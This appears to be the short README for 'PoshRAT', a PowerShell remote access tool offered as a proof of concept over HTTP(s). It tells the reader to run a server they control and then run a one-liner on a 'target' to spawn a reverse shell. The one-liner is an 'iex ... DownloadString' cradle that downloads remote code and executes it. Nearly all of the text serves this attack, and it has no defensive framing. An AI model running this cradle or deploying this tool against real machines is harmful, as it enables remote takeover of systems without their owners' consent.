PoshRAT
=======

PowerShell RAT over HTTP(s)
Proof of Concept

Start the server on a device you control.
Execute the One-Liner Command on your target to spawn a Reverse Shell.

Have Fun...

iex (New-Object Net.WebClient).DownloadString(“http://127.0.0.1/connect”)
 


